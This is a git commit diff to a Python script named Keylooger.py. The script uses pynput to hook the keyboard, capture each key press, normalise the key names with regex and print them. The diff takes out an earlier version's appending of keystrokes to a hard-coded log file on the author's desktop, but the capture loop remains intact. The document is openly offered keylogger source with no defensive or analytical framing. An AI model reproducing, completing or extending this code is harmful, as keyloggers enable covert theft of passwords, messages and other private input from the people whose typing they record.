8163310597026ebef2e880c0599cdf9ffb4c0cdf
gmailom <84289451+gmailom@users.noreply.github.com>
2021-06-06 12:48:07 -0300

    Add files via upload

--- Keylooger.py
+++ Keylooger.py
@@ -14,18 +14,14 @@ print(' conplete...................%'),
 from pynput.keyboard import Listener
 import re
 
-arquivoLog = "C:\Users\HENBOX\Desktop\Projetos\KEYLOOGER.log"
 
 def capturar(tecla):
     tecla = str(tecla)
     print(tecla)
     tecla = re.sub(r'\'', '', tecla)
-    tecla = re.sub(r'key.space', ' ', tecla)
-    tecla = re.sub(r'key.enter', '\n', tecla)
-    tecla = re.sub(r'key.*', ' ', tecla)
-
-    with open(arquivoLog, "a") as log:
-        log.write(tecla)
+    tecla = re.sub(r'Key.space', ' ', tecla)
+    tecla = re.sub(r'Key.enter', '\n', tecla)
+    tecla = re.sub(r'Key.*', '', tecla)
     
 
 with Listener(on_press=capturar) as l:
